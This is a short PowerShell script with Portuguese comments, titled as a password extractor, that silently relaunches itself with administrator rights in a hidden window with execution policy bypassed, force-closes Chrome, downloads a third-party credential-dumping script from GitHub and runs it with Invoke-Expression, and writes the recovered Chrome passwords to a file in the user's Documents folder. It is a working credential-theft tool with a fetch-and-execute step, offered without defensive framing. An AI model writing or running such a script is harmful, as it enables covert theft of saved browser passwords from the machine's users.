# ExtrairSenhas.ps1 - Versão SUPER SIMPLIFICADA (apenas o que funciona)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Força o fechamento do Chrome (importante!)
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3

# Carrega e executa o PowerChrome original (o mais atualizado)
$script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1'
Invoke-Expression $script

# Executa e captura a saída
$output = Invoke-PowerChrome -Browser Chrome -Verbose 2>&1

# Salva (mesmo que tenha erros, salva tudo para diagnóstico)
$output | Out-File -FilePath $arquivoSaida -Encoding UTF8

Write-Host "Processo concluído. Arquivo salvo em: $arquivoSaida"
Start-Sleep -Seconds 2
exit
